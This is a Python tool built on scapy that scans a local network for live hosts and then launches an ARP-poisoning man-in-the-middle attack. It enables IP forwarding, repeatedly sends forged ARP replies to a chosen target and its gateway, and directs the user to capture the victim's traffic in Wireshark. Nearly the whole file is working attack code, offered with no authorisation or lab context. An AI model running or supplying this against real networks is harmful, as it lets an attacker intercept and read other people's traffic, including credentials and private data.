#!/usr/bin/python3
# _*_ coding: utf-8 _*_

import os
import sys
import getopt
import threading
import scapy.all as scapy
from time import sleep

# <-- Termcolor -->
RED = "\033[0;31m"
YLW = "\033[1;33m"
GRN = "\033[0;32m"
WHITE = "\033[0m"

PACKET = 0
PORT_FORWARD_PATH = '/proc/sys/net/ipv4/ip_forward'


def display_banner():
    print(rf'''
{RED}███╗   ███╗██╗████████╗███╗   ███╗    ███╗   ███╗██╗████████╗███╗   ███╗
████╗ ████║██║╚══██╔══╝████╗ ████║    ████╗ ████║██║╚══██╔══╝████╗ ████║
██╔████╔██║██║   ██║   ██╔████╔██║    ██╔████╔██║██║   ██║   ██╔████╔██║
██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║    ██║╚██╔╝██║██║   ██║   ██║╚██╔╝██║
██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║    ██║ ╚═╝ ██║██║   ██║   ██║ ╚═╝ ██║
╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝    ╚═╝     ╚═╝╚═╝   ╚═╝   ╚═╝     ╚═╝
{WHITE}''')


def ifsudo():
    if os.getuid() == 0:
        return True
    else:
        print('[+] Run the File with Sudo permission!')
        exit()

# Scan live hosts on the network


def scanlivehosts(network_range):
    request = scapy.ARP()
    request.pdst = network_range
    broadcast = scapy.Ether()
    broadcast.dst = 'ff:ff:ff:ff:ff:ff'
    request_broadcast = broadcast / request
    clients = scapy.srp(request_broadcast, timeout=10, verbose=False)[0]
    print(f"\n{YLW}Live Hosts Detected:{WHITE}")
    for info in clients:
        print(f'Host {RED}{info[1].psrc}{WHITE} is up --> MAC: {RED}{info[1].hwsrc}{WHITE}')
    print(f"{GRN}[!] Scan complete!{WHITE}")

# Enabling port forwarding


def set_port_forwarding_to_true():
    os.system(f'echo 1 > {PORT_FORWARD_PATH}')

# Disabling port forwarding


def set_port_forwarding_to_false():
    os.system(f'echo 0 > {PORT_FORWARD_PATH}')

# Getting target's MAC address


def mac(target):
    arp_request = scapy.ARP(pdst=target)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast,
                              timeout=5, verbose=False)[0]
    return answered_list[0][1].hwsrc if answered_list else None

# ARP spoofing


def arpspoofing(target, gateway):
    macaddr = mac(target)
    packet = scapy.ARP(op=2, pdst=target, hwdst=macaddr, psrc=gateway)
    scapy.send(packet, verbose=False)

# ARP poisoning


def arppoisoning(target, gateway):
    global PACKET
    try:
        while True:
            arpspoofing(target, gateway)
            arpspoofing(gateway, target)
            PACKET += 2
            print(f'[+] ARP Packets Sent: {PACKET}', end='\r')
            sleep(1)
    except KeyboardInterrupt:
        pass


# Main program
if __name__ == '__main__':
    if sys.hexversion >= 0x3000000:
        display_banner()
        ifsudo()

        # Main Menu
        print(f"\n{YLW}[1]{WHITE} Network Scan")
        print(f"{YLW}[2]{WHITE} Launch MITM Attack")
        print(f"{YLW}[3]{WHITE} Exit\n")

        choice = input(f"{GRN}Select an option: {WHITE}")
        if choice == '1':
            network_range = input(
                f"{GRN}Enter network range (e.g., 192.168.0.0/24): {WHITE}")
            scanlivehosts(network_range)

        elif choice == '2':
            interface = input(f"{GRN}Enter interface (e.g., wlan0): {WHITE}")
            target = input(f"{GRN}Enter target IP address: {WHITE}")
            gateway = input(f"{GRN}Enter gateway IP address: {WHITE}")

            set_port_forwarding_to_true()
            print(f'[+] Target --> {target}')
            print(f'[+] Gateway --> {gateway}')
            print(f'[+] Interface --> {interface}')
            print(f'[!] Make sure to {RED}OPEN WIRESHARK{WHITE} and capture the request with the filter "{RED}ip.addr=={target}{WHITE}"')

            t1 = threading.Thread(target=arppoisoning, args=(
                target, gateway), daemon=True)
            t1.start()
            t1.join()

            set_port_forwarding_to_false()

        elif choice == '3':
            print(f"{GRN}Exiting...{WHITE}")
            sys.exit(0)
        else:
            print(f"{RED}Invalid option selected!{WHITE}")

    else:
        print('[+] Required Python Version > 3.0!')
